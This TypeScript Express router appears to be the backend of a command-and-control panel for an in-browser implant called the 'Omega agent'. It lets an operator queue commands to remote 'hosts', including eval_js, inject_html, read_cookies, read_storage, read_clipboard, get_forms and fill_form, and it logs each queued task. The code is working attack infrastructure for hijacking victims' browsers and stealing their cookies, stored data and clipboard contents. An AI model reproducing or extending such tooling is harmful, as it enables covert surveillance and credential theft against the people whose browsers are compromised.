// Copyright © 2026 Alpha Unlimited Technologies LLC. All rights reserved.
import { Router, type IRouter } from "express";
import { eq, desc } from "drizzle-orm";
import { db, remoteCommandsTable, eventsTable, hostsTable } from "@workspace/db";
import { serializeDates } from "../../lib/serialize";

const router: IRouter = Router();

// Web-appropriate command types — executed in-browser by the Omega agent
const VALID_COMMANDS = [
  "eval_js",
  "inject_html",
  "get_dom",
  "read_storage",
  "read_cookies",
  "get_forms",
  "get_scripts",
  "take_screenshot",
  "fill_form",
  "click_element",
  "navigate_url",
  "show_alert",
  "show_overlay",
  "read_clipboard",
  "set_clipboard",
  "list_indexeddb",
  "list_cache_storage",
];

router.get("/remote-commands/:hostId", async (req, res): Promise<void> => {
  const hostId = parseInt(req.params.hostId, 10);
  if (isNaN(hostId)) { res.status(400).json({ error: "Invalid hostId" }); return; }
  const rows = await db.select().from(remoteCommandsTable)
    .where(eq(remoteCommandsTable.hostId, hostId))
    .orderBy(desc(remoteCommandsTable.executedAt))
    .limit(100);
  res.json(rows.map(r => serializeDates(r)));
});

router.post("/remote-commands/:hostId/execute", async (req, res): Promise<void> => {
  const hostId = parseInt(req.params.hostId, 10);
  if (isNaN(hostId)) { res.status(400).json({ error: "Invalid hostId" }); return; }
  const { commandType, params = "" } = req.body;
  if (!commandType || !VALID_COMMANDS.includes(commandType)) {
    res.status(400).json({ error: "Invalid commandType" }); return;
  }
  const rawParams = typeof params === "string" ? params : JSON.stringify(params);
  if (rawParams.length > 8192) {
    res.status(400).json({ error: "params too large (max 8192 bytes)" }); return;
  }
  const paramsStr = rawParams;

  // Queue as pending — the agent will pick it up on next checkin
  const [cmd] = await db.insert(remoteCommandsTable).values({
    hostId,
    commandType,
    params: paramsStr,
    status: "pending",
    result: "",
    executedAt: new Date(),
  }).returning();

  const [host] = await db.select().from(hostsTable).where(eq(hostsTable.id, hostId));
  await db.insert(eventsTable).values({
    hostId,
    hostIp: host?.ip ?? null,
    hostLabel: host?.label ?? null,
    category: "Command",
    action: `Queued: ${commandType}`,
    details: paramsStr ? `Params: ${paramsStr.substring(0, 150)}` : "No params",
    severity: "info",
  });
  res.json(serializeDates(cmd));
});

export default router;
